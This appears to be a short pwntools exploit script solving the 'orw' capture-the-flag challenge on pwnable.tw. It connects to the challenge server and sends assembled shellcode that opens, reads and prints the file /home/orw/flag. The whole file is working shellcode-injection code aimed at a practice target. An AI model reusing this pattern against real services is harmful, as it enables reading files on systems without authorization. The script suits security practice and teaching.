```python
#!/usr/bin/env python2
#-*-coding:utf8-*-

from pwn import *

context.log_level = 'debug'
IP = 'chall.pwnable.tw'
PORT = '10001'
r = remote(IP, PORT)

r.recvuntil('Give my your shellcode:')

shellcode = shellcraft.open('/home/orw/flag')
shellcode += shellcraft.read('eax', 'esp', len(shellcode))
shellcode += shellcraft.write(1, 'esp', len(shellcode))

payload = asm(shellcode)
r.sendline(payload)
r.interactive()
```
